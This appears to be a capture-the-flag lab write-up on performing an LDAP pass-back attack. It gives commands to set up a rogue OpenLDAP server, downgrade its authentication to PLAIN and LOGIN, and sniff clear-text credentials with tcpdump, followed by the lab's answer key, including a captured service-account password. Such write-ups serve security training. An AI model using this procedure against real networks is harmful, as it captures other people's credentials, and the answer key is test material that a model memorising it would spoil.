## Performing an LDAP Pass-back

>> Use the following command to install OpenLDAP which will be used later to create
a rouge LDAP server.

`sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd`

>> Then configure your own rogue LDAP server
`sudo dpkg-reconfigure -p low slapd`

Before using the rogue LDAP server, we need to make it vulnerable by downgrading the supported authentication mechanisms. We want to ensure that our LDAP server only supports PLAIN and LOGIN authentication methods. Use the ldif file to patch your LDAP server.

`sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart`

Then verify that our rogue LDAP server's configuration has been applied using the following command:

`ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms`

Once Configured correctly, run tcpdump on the interface connected to the network, tun0 in my case, by the following command:

```shell
sudo tcpdump -SX -i **interface** tcp port 389
```

-----------------------------------------------------------------------------------------

# Answers

1. What type of attack can be performed against LDAP Authentication systems not commonly found against Windows Authentication systems?
`LDAP Pass-back Attack`

2. What two authentication mechanisms do we allow on our rogue LDAP server to downgrade the authentication and make it clear text?
`LOGIN,PLAIN`

3. What is the password associated with the svcLDAP account?
`tryhackmeldappass1@`



